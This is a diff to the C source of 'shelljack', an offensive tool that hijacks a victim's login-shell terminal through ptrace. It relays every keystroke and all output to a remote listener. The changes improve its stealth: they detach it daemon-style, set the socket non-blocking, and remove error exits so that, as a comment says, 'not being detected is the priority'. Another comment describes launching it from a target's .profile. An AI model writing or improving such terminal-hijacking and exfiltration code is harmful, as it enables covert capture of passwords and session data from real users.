@@ -1,3 +1,4 @@
+
 /*
  *  shelljack 
  *    
@@ -57,6 +58,7 @@
 #include <arpa/inet.h>
 
 #include <sys/ioctl.h>
+#include <sys/resource.h>
 #include <sys/select.h>
 #include <sys/socket.h>
 #include <sys/types.h>
@@ -67,6 +69,8 @@
 
 #define LOCAL_BUFFER_LEN 64
 #define READLINE_BUFFER_LEN	256
+
+#define ATTATCH_DELAY 1
 
 
 volatile sig_atomic_t sig_found = 0;
@@ -101,6 +105,7 @@ int main(int argc, char **argv){
 	int current_sig;
 	int target_pid;
 	int target_fd_count, *target_fds = NULL;
+	int fcntl_flags;
 
 	char *argv_index;	
 	char scratch[LOCAL_BUFFER_LEN];
@@ -109,9 +114,9 @@ int main(int argc, char **argv){
 	char *tmp_ptr;
 	char *tty_name;
 
-	struct addrinfo *addrinfo_result, *addrinfo_ptr;
+	struct addrinfo addrinfo_hint, *addrinfo_result, *addrinfo_ptr;
 	struct ptrace_do *target;
-	struct termios saved_termios_attrs;
+	struct termios saved_termios_attrs, new_termios_attrs;
 	struct sockaddr sa;
 	struct sigaction act, oldact;
 	struct winsize argp;
@@ -124,38 +129,11 @@ int main(int argc, char **argv){
 	
 	void *remote_addr;
 
+	struct rlimit fd_limit;
+
 	if(argc != 3){
 		usage();
 	}
-
-	/*
-	 *	We need to ensure that we are not the process group leader.
-	 *	This is a requirement for setsid() later. We will accomplish
-	 *	this by forking a child and killing the parent.
-	 */
-	if((retval = fork()) == -1){
-		error(-1, errno, "fork()");
-	}
-
-	if(retval){
-		return(0);
-	}
-
-	/*
-	 * We're going to mess around with hijacking the tty for a login shell. SIGHUP is a certainty.
-	 */
-	signal(SIGHUP, SIG_IGN);
-
-	/*
-	 * This helps with a race condition if being launched out of the target's .profile in order 
-	 * to attack the login shell. Apparently, bash sources the .profile *before* it configures the tty.
-	 */
-	sleep(1);
-
-
-	/*************************************************************
-	 * Connect to the listener and set up our fds appropriately. *
-	 *************************************************************/
 
 	if(((argv_index = index(argv[1], ':')) == NULL)){
 		usage();
@@ -167,7 +145,56 @@ int main(int argc, char **argv){
 		usage();
 	}
 
-	if((retval = getaddrinfo(argv[1], argv_index, NULL, &addrinfo_result))){
+	/*
+	 * We're going to mess around with hijacking the tty for a login shell. SIGHUP is a certainty.
+	 */
+	signal(SIGHUP, SIG_IGN);
+
+	/*
+	 *	We aren't *really* a daemon, because we will end up with a controlling tty.
+	 *	However, we will act daemon-like otherwise. Lets do those daemon-like things now.
+	 */
+
+	umask(0);
+
+	if((retval = fork()) == -1){
+		error(-1, errno, "fork()");
+	}
+
+	if(retval){
+		return(0);
+	}
+
+	if((int) (retval = setsid()) == -1){
+		error(-1, errno, "setsid()");
+	}
+
+	if((retval = chdir("/")) == -1){
+		error(-1, errno, "chdir(\"/\")");
+	}
+
+	if((retval = getrlimit(RLIMIT_NOFILE, &fd_limit))){
+		error(-1, errno, "getrlimie(RLIMIT_NOFILE, %lx)", (unsigned long) &fd_limit);
+	}
+
+	
+	// Lets close any file descriptors we may have inherited.
+	for(i = 0; i < (int) fd_limit.rlim_max; i++){
+		if(i != STDERR_FILENO){
+			close(i);
+		}
+	}
+
+
+	/*************************************************************
+	 * Connect to the listener and set up stdout and stderr
+	 *************************************************************/
+
+	memset(&addrinfo_hint, 0, sizeof(struct addrinfo));
+	addrinfo_hint.ai_family = AF_UNSPEC;
+	addrinfo_hint.ai_socktype = SOCK_STREAM;
+
+	if((retval = getaddrinfo(argv[1], argv_index, &addrinfo_hint, &addrinfo_result))){
 		error(-1, 0, "getaddrinfo(%s, %s, %d, %lx): %s", \
 				argv[1], argv_index, 0, (unsigned long) &addrinfo_result, gai_strerror(retval));
 	}
@@ -189,29 +216,38 @@ int main(int argc, char **argv){
 		error(-1, 0, "Unable to connect to %s:%s. Quiting.", argv[1], argv_index);
 	}
 
-	if((retval = ioctl(0, TIOCNOTTY)) == -1){
-		error(-1, errno, "ioctl(%d, %d)", 0, TIOCNOTTY);
+	/*
+	 * We will set the socket non-blocking. If the connection dies, the remote 
+	 * write() shouldn't block or cause an exit(). We *may* lose data, but not being
+	 * detected is the priority here.
+	 */
+	if((fcntl_flags = fcntl(tmp_fd, F_GETFL, 0)) == -1){
+		error(-1, errno, "fcntl(%d, FGETFL, 0)", tmp_fd);
 	}
 
-	if((retval = close(0)) == -1){
-		error(-1, errno, "close(%d)", 0);
+	fcntl_flags |= O_NONBLOCK;
+	if((retval = fcntl(tmp_fd, F_SETFL, fcntl_flags)) == -1){
+		error(-1, errno, "fcntl(%d, FSETFL, %d)", tmp_fd, fcntl_flags);
 	}
 
-	if((retval = close(1)) == -1){
-		error(-1, errno, "close(%d)", 1);
+	if((retval = close(STDERR_FILENO)) == -1){
+		error(-1, errno, "close(%d)", STDERR_FILENO);
 	}
 
-	if((retval = dup2(tmp_fd, 1)) == -1){
-		error(-1, errno, "dup2(%d, %d)", tmp_fd, 1);
+	if((retval = dup2(tmp_fd, STDERR_FILENO)) == -1){
+		error(-1, errno, "dup2(%d, %d)", tmp_fd, STDERR_FILENO);
 	}
 
-	if((retval = close(2)) == -1){
-		exit(-2);
-	}
-	if((retval = dup2(tmp_fd, 2)) == -1){
-		exit(-3);
+	if((retval = dup2(tmp_fd, STDOUT_FILENO)) == -1){
+		error(-1, errno, "dup2(%d, %d)", tmp_fd, STDOUT_FILENO);
 	}
 
+
+	/*
+	 * This helps with a race condition if being launched out of the target's .profile in order 
+	 * to attack the login shell. Apparently, bash sources the .profile *before* it configures the tty.
+	 */
+	sleep(ATTATCH_DELAY);
 
 	/***************************************
 	 * Print out some initialization data. *
@@ -344,12 +380,6 @@ int main(int argc, char **argv){
 				goto CLEAN_UP;
 			}
 
-			if((int) (retval = setsid()) == -1){
-				error(0, errno, "setsid()");
-				ptrace_error = 1;
-				goto CLEAN_UP;
-			}
-
 			/* Now set original tty as our ctty in the local context. */
 			if((retval = ioctl(original_tty_fd, TIOCSCTTY, 1)) == -1){
 				error(0, errno, "ioctl(%d, %d, %d)", original_tty_fd, TIOCSCTTY, 1);
@@ -457,6 +487,26 @@ CLEAN_UP:
 
 
 	/**************************************************
+	 * Set the original tty to raw mode.
+	 **************************************************/
+	memcpy(&new_termios_attrs, &saved_termios_attrs, sizeof(struct termios));
+
+	new_termios_attrs.c_lflag &= ~(ECHO|ICANON|IEXTEN|ISIG);
+	new_termios_attrs.c_iflag &= ~(BRKINT|ICRNL|INPCK|ISTRIP|IXON);
+	new_termios_attrs.c_cflag &= ~(CSIZE|PARENB);
+	new_termios_attrs.c_cflag |= CS8;
+	new_termios_attrs.c_oflag &= ~(OPOST);
+
+	new_termios_attrs.c_cc[VMIN] = 1;
+	new_termios_attrs.c_cc[VTIME] = 0;
+
+	if((retval = tcsetattr(original_tty_fd, TCSANOW, &new_termios_attrs)) == -1){
+		error(-1, errno, "tcsetattr(%d, TCSANOW, %lx)", \
+				original_tty_fd, (unsigned long) &new_termios_attrs);
+	}
+
+
+	/**************************************************
 	 * Set the signals for appropriate mitm handling. *
 	 **************************************************/
 
@@ -554,8 +604,9 @@ CLEAN_UP:
 				case SIGINT:
 				case SIGQUIT:
 				case SIGTSTP:
+
 					if((sig_pid = tcgetpgrp(new_tty_fd)) == -1){
-						error(-1, errno, "tcgetgid(%d)", new_tty_fd);
+						error(-1, errno, "tcgetpgrp(%d)", new_tty_fd);
 					}
 
 					if((retval = kill(-sig_pid, current_sig)) == -1){
@@ -586,6 +637,8 @@ CLEAN_UP:
 					break;
 			}
 
+			current_sig = 0;
+
 			/*
 			 * From here on out, we pass chars back and forth, while copying them off
 			 * to the remote listener. The "char_read" hack is a cheap way to watch for
@@ -606,21 +659,14 @@ CLEAN_UP:
 				error(-1, errno, "write(%d, %lx, %d)", \
 						new_tty_fd, (unsigned long) scratch, bytes_read);
 			}
+
 			if(!char_read){
 				if(bytes_read == 1){
 					char_read = scratch[0];
 				}
 			}else{
 				if(bytes_read == 1){
-					if((retval = write(1, &char_read, 1)) == -1){
-
-						// If the remote write() fails, do we *really* want to exit as a failure?
-						// I suspect we'd want to comment out this error() call (and the one
-						// further down) and let it fail quietly, while continuing to pass 
-						// chars back and forth. 
-						error(-1, errno, "write(%d, %lx, %d)", \
-								1, (unsigned long) &char_read, 1);
-					}
+					write(STDOUT_FILENO, &char_read, 1);
 					char_read = scratch[0];
 				}
 			}
@@ -643,10 +689,7 @@ CLEAN_UP:
 						original_tty_fd, (unsigned long) &char_read, bytes_read);
 			}
 
-			if((retval = write(1, scratch, bytes_read)) == -1){
-				error(-1, errno, "write(%d, %lx, %d)", \
-						1, (unsigned long) scratch, bytes_read);
-			}
+			write(STDOUT_FILENO, scratch, bytes_read);
 		}
 	}
 
